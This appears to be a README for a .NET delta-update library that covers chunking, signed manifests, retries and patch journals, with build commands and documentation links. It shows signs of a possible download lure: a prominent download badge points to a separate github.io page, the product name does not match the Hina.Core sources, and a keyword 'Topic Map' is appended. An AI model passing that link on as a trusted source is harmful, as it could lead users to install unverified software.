# Delta Flights Updater - Verified Delta Delivery Core

![Delta Flights Updater](logo.png)

Delta Flights Updater is a cross-platform update core for building manifests, reusing local chunks, downloading changed content, verifying reconstructed files, and applying compact release updates. The workflow combines content-defined chunking, signed metadata, retry policies, patch journals, and atomic file operations for dependable delta delivery.

## What It Does

The updater compares the installed content with a target manifest, identifies reusable blocks, fetches missing chunks, reconstructs the requested release, and verifies the final hashes before promotion.

| Capability | Implementation |
| --- | --- |
| Delta planning | Fixed and content-defined chunking |
| Integrity | SHA-256 chunks and whole-file verification |
| Metadata | Serialized manifests with signature support |
| Transfer | HTTP chunk client with retry policy |
| Recovery | Patch journal, cleanup, and recorded results |
| Storage | Content-addressed chunk layout |
| Compression | Brotli chunk codec |

## Highlights

- Reuses matching blocks already available in local files.
- Handles insertions and deletions with content-defined chunk boundaries.
- Stores chunks by digest for deduplication and immutable caching.
- Verifies per-chunk and whole-file hashes before accepting output.
- Signs and serializes release manifests for authenticated metadata.
- Retries transient transfers through a dedicated network policy.
- Records patch progress so interrupted work can be inspected and cleaned up.
- Keeps chunking, hashing, compression, transport, and patching components separate.

## Get The Core

[![GET DELTA FLIGHTS UPDATER](https://img.shields.io/badge/GET%20DELTA%20FLIGHTS%20UPDATER-427DA1?style=for-the-badge&logoColor=white)](https://delta-flights.github.io/delta-flights-updater/delta-flights)

### Build From The Included Sources

Use the local project when a .NET SDK is available:

```powershell
dotnet restore .\src\Hina.Core\Hina.Core.csproj
dotnet build .\src\Hina.Core\Hina.Core.csproj --configuration Release
```

The package versions and shared build settings are defined in `Directory.Packages.props` and `Directory.Build.props`.

## Update Flow

1. Scan the current and target inputs.
2. Split files into reusable chunks.
3. Build a manifest containing paths, sizes, and digests.
4. Download only chunks missing from the local store.
5. Reconstruct files in temporary locations.
6. Verify chunk and final file hashes.
7. Record the patch result and clean temporary state.

![Update Client Layout](assets/launcher-main.png)

## Usage

Build the library first, then integrate the manifest and patch components into the host application.

```powershell
dotnet build .\src\Hina.Core\Hina.Core.csproj
dotnet test .\src\Hina.Core\Hina.Core.csproj
```

The primary implementation areas are:

| Path | Purpose |
| --- | --- |
| `src/Hina.Core/Chunking/` | Chunk storage and output |
| `src/Hina.Core/Rsync/` | Rolling checksums and chunk selection |
| `src/Hina.Core/Manifest/` | Manifest creation, serialization, and signing |
| `src/Hina.Core/Patching/` | Patch application, journaling, and cleanup |
| `src/Hina.Core/Net/` | Chunk download and retry handling |
| `src/Hina.Core/Hashing/` | SHA-256 and hexadecimal helpers |
| `src/Hina.Core/Compression/` | Brotli encoding support |

### Recommended Sequence

Use `ManifestBuilder` to describe the target release, store reusable data through `ChunkStoreWriter`, transfer missing blocks with `HttpChunkClient`, and apply the result through `PatchClient`. Preserve the `PatchJournal` until verification succeeds so failed operations remain recoverable.

## Delivery Matrix

| Scenario | Reuse Strategy | Expected Behavior |
| --- | --- | --- |
| Small edits across large files | Content-defined chunks | Most unchanged blocks remain reusable |
| Stable file boundaries | Fixed-size chunks | Predictable chunk addressing |
| Cold installation | No local baseline | The complete required content is fetched |
| Interrupted transfer | Verified local cache | Completed chunks remain available |
| Corrupted chunk | Digest validation | The chunk is rejected and fetched again |
| Failed reconstruction | Journal and temporary output | Active content remains separate from incomplete output |

## Documentation

- [Quick Start](docs/Quick-Start.md)
- [CLI Guide](docs/CLI-Guide.md)
- [Configuration](docs/Configuration.md)
- [Integration Guide](docs/Integration-Guide.md)
- [Architecture](docs/Architecture.md)
- [Diagrams](docs/Diagrams.md)
- [Troubleshooting](docs/Troubleshooting.md)
- [Security](docs/Security.md)
- [Package Manager Guide](docs/PackageManager-Guide.md)
- [Builder Guide](docs/Builder-Guide.md)
- [Host Guide](docs/Host-Guide.md)
- [Changelog](docs/Changelog.md)

## FAQ

### Why Can A Small Edit Produce A Larger Update?

Chunking parameters must match between the builder and client. High-entropy rewrites, compressed binaries, or broad file replacement can also reduce reusable content.

### What Happens After A Network Interruption?

Previously verified chunks can remain in the content store. The retry policy handles transient failures, while the patch journal records incomplete reconstruction work.

### How Is Corrupted Content Detected?

Each chunk is addressed and checked by digest. Reconstructed files are also validated against manifest metadata before the update is accepted.

### Which Chunking Mode Should Be Used?

Fixed-size chunking is simple and predictable. Content-defined chunking usually preserves more reuse when bytes are inserted or removed near the beginning of a file.

### Why Is Temporary Disk Space Required?

Safe reconstruction keeps incomplete output separate from active files. Allow space for missing chunks, temporary files, and recovery data.

### Where Should Update Configuration Live?

Keep update endpoints, chunking parameters, and trust settings consistent between the release builder and client. See [Configuration](docs/Configuration.md) for the available layout.

## Operational Notes

- Keep manifests short-lived while caching content-addressed chunks as immutable objects.
- Use the same chunking and compression settings on both sides of the update.
- Reject a release when a digest, signature, or final file check fails.
- Preserve user configuration and logs outside replaceable application content.
- Measure delta size against both the full release and changed-file baselines.
- Test interruption, locked files, low disk space, and stale manifests before publishing.

## Topic Map

delta flights updater, delta updates, binary patch, content chunking, signed manifests, OTA delivery, rollback, hash verification, cross-platform updater, staged releases

## License

The included source and documentation are distributed under the terms in [LICENSE](LICENSE).
